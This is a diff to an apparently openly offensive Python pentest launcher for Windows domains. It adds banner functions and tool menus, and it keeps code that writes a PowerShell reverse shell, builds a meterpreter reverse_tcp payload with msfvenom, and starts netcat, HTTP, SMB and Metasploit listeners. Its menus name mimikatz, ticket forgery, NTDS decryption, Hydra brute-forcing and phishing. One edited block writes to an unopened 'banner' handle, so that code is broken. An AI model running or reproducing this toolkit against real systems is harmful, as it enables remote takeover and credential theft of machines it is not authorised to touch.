@@ -185,6 +185,69 @@ def keys():
    print("\tHKEY_USERS          HKU ")
    print("\tHKEY_CURRENT_CONFIG HKCC")
    return
+   
+def banner1():
+   with open("banner.tmp", "w") as banner:
+      banner.write("\t\t__        _____ _   _   __  __    _    ____ _____ _____ ____    \n")
+      banner.write("\t\t\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \   \n")
+      banner.write("\t\t \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) |  \n")
+      banner.write("\t\t  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ <   \n")
+      banner.write("\t\t   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\  \n")
+      banner.write("\t\t                                                                \n")
+      banner.write("\t\t      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)      \n")
+      banner.write("\t\t                                                                \n")
+   return
+   
+def banner2():
+   with open("banner.tmp", "w") as banner:
+      banner.write("\t\t__        _____ _   _    _   _ _____ _____ ____    ____  _____ ______     _______ ____   \n")
+      banner.write("\t\t\ \      / /_ _| \ | |  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
+      banner.write("\t\t \ \ /\ / / | ||  \| |  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
+      banner.write("\t\t  \ V  V /  | || |\  |  |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  \n")
+      banner.write("\t\t   \_/\_/  |___|_| \_|  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
+      banner.write("\t\t                                                                                         \n")
+      banner.write("\t\t                  BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                  \n")
+      banner.write("                                                                                             \n")
+   return
+     
+def banner3():
+   with open("banner.tmp", "w") as banner:
+      banner.write("\t\t__        _____ _   _   ____  __  __ ____    ____  _____ ______     _______ ____   \n") 
+      banner.write("\t\t\ \      / /_ _| \ | | / ___||  \/  | __ )  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
+      banner.write("\t\t \ \ /\ / / | ||  \| | \___ \| |\/| |  _ \  \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
+      banner.write("\t\t  \ V  V /  | || |\  |  ___) | |  | | |_) |  ___) | |___|  _ < \ V / | |___|  _ <  \n")
+      banner.write("\t\t   \_/\_/  |___|_| \_| |____/|_|  |_|____/  |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
+      banner.write("\t\t                                                                                   \n")
+      banner.write("\t\t                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)              \n")
+      banner.write("                                                                                       \n")
+   return
+
+def banner4():
+   with open("banner.tmp", "w") as banner:
+      banner.write("\t\t__        _____ _   _   __  __ _____ _____ _____ ____  ____  ____  _____ _____ _____ ____   \n")
+      banner.write("\t\t\ \      / /_ _| \ | | |  \/  | ____|_   _| ____|  _ \|  _ \|  _ \| ____|_   _| ____|  _ \  \n")
+      banner.write("\t\t \ \ /\ / / | ||  \| | | |\/| |  _|   | | |  _| | |_) | |_) | |_) |  _|   | | |  _| | |_) | \n")
+      banner.write("\t\t  \ V  V /  | || |\  | | |  | | |___  | | | |___|  _ <|  __/|  _ <| |___  | | | |___|  _ <  \n") 
+      banner.write("\t\t   \_/\_/  |___|_| \_| |_|  |_|_____| |_| |_____|_| \_\_|   |_| \_\_____| |_| |_____|_| \_\ \n")
+      banner.write("\t\t                                                                                            \n")
+      banner.write("\t\t                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                       \n")
+      banner.write("                                                                                                \n")
+   return
+
+def submenu():
+   with open("banner.tmp", "w")  as banner:
+      banner.write("                                                                                                                                                         \n")
+      banner.write("ENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		     \n")
+      banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
+      banner.write("jawsenum.ps1                meterpreter.exe                 powerup.ps1                     nc64.exe                        mimidump.ps1                 \n")
+      banner.write("sharphound.ps1              webshell.php                    powercat.ps                     plink64.exe                     mimikatz.ps1                 \n")
+      banner.write("sharphound.exe              myshell.php                     powerview.ps1                   chisel64.exe                    winpwn.ps1                   \n")
+      banner.write("winpeas32.exe               image.php.jpg                   powermad.ps1                    test_clsid.bat                  lovelypotato.ps1             \n")
+      banner.write("winpeas64.exe                                               procdump32.exe                  rogueoxidresolver.exe           roguepotato.exe              \n")
+      banner.write("rubeus.exe                                                  procdump64.exe                                                  mimikatz64.exe               \n")
+      banner.write("nmapsetup.exe                                                                                                               mimikatz32.exe               \n")
+      banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
+   return
 
 def display():
    print('\u2554' + ('\u2550')*57 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
@@ -454,7 +517,8 @@ def display():
 # -------------------------------------------------------------------------------------
 
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
-
+   return
+   
 def options():
    print('\u2551' + "(0) REMOTE IP Scanner  (10) Re/Set SHARE NAME  (20) GetArch (30) WinDap Search  (40) Kerberos Info  (50) Golden PAC  (60) GenSSHKeyID (70) Hydra FTP  (80) FTP     " + '\u2551')
    print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set SERVER TIME (21) NetView (31) Lookup SIDs    (41) KerbUserFilter (51) Domain Dump (61) GenListUSER (71) Hydra SSH  (81) SSH     " + '\u2551')
@@ -467,6 +531,7 @@ def options():
    print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbCopy Files  (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm   " + '\u2551')
    print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMap SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
+   return
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -477,15 +542,9 @@ def options():
 # -------------------------------------------------------------------------------------
 
 command("clear")
-command("xdotool key Alt+Shift+S; xdotool type 'WIN-MASTER'; xdotool key Return")
-
-print("__        _____ _   _   __  __    _    ____ _____ _____ ____   ")
-print("\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \  ")
-print(" \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) | ")
-print("  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ <  ")
-print("   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\\")
-print("                                                               ")
-print("      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)   \n")
+command("xdotool key Alt+Shift+S; xdotool type 'WIN MASTER'; xdotool key Return")
+banner1()
+command("cat banner.tmp")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -635,61 +694,80 @@ if":" in TIP:
 else:
    IP46 = "-4"
    
-#-----
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Set up local exploit files.
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
 
 print("[" + colored("*", colour8) + "] Creating exploit files...")
 command("cp " + httpDir + "/template.txt " + httpDir + "/reverseshell.ps1")
 command('echo Invoke-PowerShellTcp -Reverse -IPAddress ' + localIP + ' -Port 9001 >> ' + httpDir + '/reverseshell.ps1')
 command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -f exe -o " + httpDir + "/meterpreter.exe  > /dev/null 2>&1")
 
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Start HTTP server.
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
+
 print("[" + colored("*", colour8) + "] Starting HTTP server...")
 time.sleep(2)
-with open("logo.tmp", "w") as logo:
-   logo.write("\t\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   \n")
-   logo.write("\t\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
-   logo.write("\t\t \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /\___ \  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
-   logo.write("\t\t  \ V  V /  | || |\  | |_| | |_| |\ V  V /  ___) | |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  \n")
-   logo.write("\t\t   \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |____/  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
-   logo.write("\t\t                                                                                                                    \n")
-   logo.write("\t\t                                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                               \n\n\n")
-   logo.write("ENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		\n")
-   logo.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   logo.write("jawsenum.ps1			meterpreter.exe			powerup.ps1			nc64.exe			mimidump.ps1            \n")
-   logo.write("sharphound.ps1			webshell.php			powercat.ps			plink64.exe			mimikatz.ps1		\n")
-   logo.write("sharphound.exe			myshell.php			powerview.ps1			chisel64.exe			winpwn.ps1		\n")
-   logo.write("winpeas32.exe			image.php.jpg			powermad.ps1			test_clsid.bat			lovelypotato.ps1	\n")
-   logo.write("winpeas64.exe							procdump32.exe			rogueoxidresolver.exe		roguepotato.exe		\n")
-   logo.write("rubeus.exe							procdump64.exe							mimikatz64.exe		\n")
-   logo.write("nmapsetup.exe															mimikatz32.exe          \n")
-   logo.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
+banner2()
 
 command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return; sleep 2")
-command("xdotool type 'cat logo.tmp'; xdotool key Return")
+command("xdotool key Alt+Shift+S; xdotool type 'WIN HTTP SERVER'; xdotool key Return; sleep 2")
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
+submenu()
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
 command("xdotool type 'python3 -m http.server 80'; xdotool key Return; sleep 2")
 command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
 
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Start SMB server.
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
+
 print("[" + colored("*", colour8) + "] Starting SMB server...")
+banner3()
 time.sleep(2)
+
 command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'SMB Server'; xdotool key Return; sleep 2")
+command("xdotool key Alt+Shift+S; xdotool type 'WIN SMB Server'; xdotool key Return; sleep 2")
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
 command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
 
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Start metersploit server
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
+
 print("[" + colored("*", colour8) + "] Starting metasploit server...")
+banner4()
 time.sleep(2)
+
 with open("meterpreter.rc", "w") as write:
    write.write("use exploit/multi/handler\n")
    write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    write.write("set LHOST " + localIP + "\n")
-   write.write("clear\n")
-   write.write("show options\n")
    write.write("run\n")
 
 command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'Meterpreter'; xdotool key Return; sleep 2")
+command("xdotool key Alt+Shift+S; xdotool type 'WIN METERPRETER'; xdotool key Return; sleep 2")
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
 command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
@@ -700,7 +778,7 @@ time.sleep(5)
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Start the main menu controller.
+# Details : Start the main menu controller
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
@@ -2649,13 +2727,13 @@ while True:
          command("xdotool key Alt+Shift+S; xdotool type 'Go Phishing'; xdotool key Return; sleep 2")
          
          with open("logo2.tmp", "a") as logo:
-            logo.write("  ____  ___    ____  _   _ ___ ____  _   _ ___ _   _  ____ \n")
-            logo.write(" / ___|/ _ \  |  _ \| | | |_ _/ ___|| | | |_ _| \ | |/ ___|\n")
-            logo.write("| |  _| | | | | |_) | |_| || |\___ \| |_| || ||  \| | |  _ \n")
-            logo.write("| |_| | |_| | |  __/|  _  || | ___) |  _  || || |\  | |_| |\n")
-            logo.write(" \____|\___/  |_|   |_| |_|___|____/|_| |_|___|_| \_|\____|\n")
-            logo.write("                                                           \n")
-            logo.write("   BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)    \n")
+            banner.write("  ____  ___    ____  _   _ ___ ____  _   _ ___ _   _  ____ \n")
+            banner.write(" / ___|/ _ \  |  _ \| | | |_ _/ ___|| | | |_ _| \ | |/ ___|\n")
+            banner.write("| |  _| | | | | |_) | |_| || |\___ \| |_| || ||  \| | |  _ \n")
+            banner.write("| |_| | |_| | |  __/|  _  || | ___) |  _  || || |\  | |_| |\n")
+            banner.write(" \____|\___/  |_|   |_| |_|___|____/|_| |_|___|_| \_|\____|\n")
+            banner.write("                                                           \n")
+            banner.write("   BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)    \n")
          logo.close()
          
          command("xdotool type 'cat logo2.tmp'; xdotool key Return")
